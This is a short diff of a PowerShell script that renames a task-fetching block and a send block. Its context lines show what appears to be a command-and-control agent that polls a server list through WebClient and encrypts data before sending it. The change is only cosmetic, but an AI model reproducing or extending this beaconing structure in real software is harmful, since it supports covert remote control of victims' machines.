@@ -5,7 +5,7 @@ if ($host.StartsWith('https')) {
 }
 $Script:servers = @($Script:host)
 
-$Script:getTask = {
+$Script:GetTask = {
     try {
         if ($Script:servers[$Script:index].StartsWith("http")) {
             $client = New-Object System.Net.WebClient
@@ -33,7 +33,7 @@ $Script:getTask = {
     }
 }
 
-$Script:send = {
+$Script:SendMessage = {
     param ($data)
     if ($data) {
         $encryptedData = Encrypt-Bytes $data
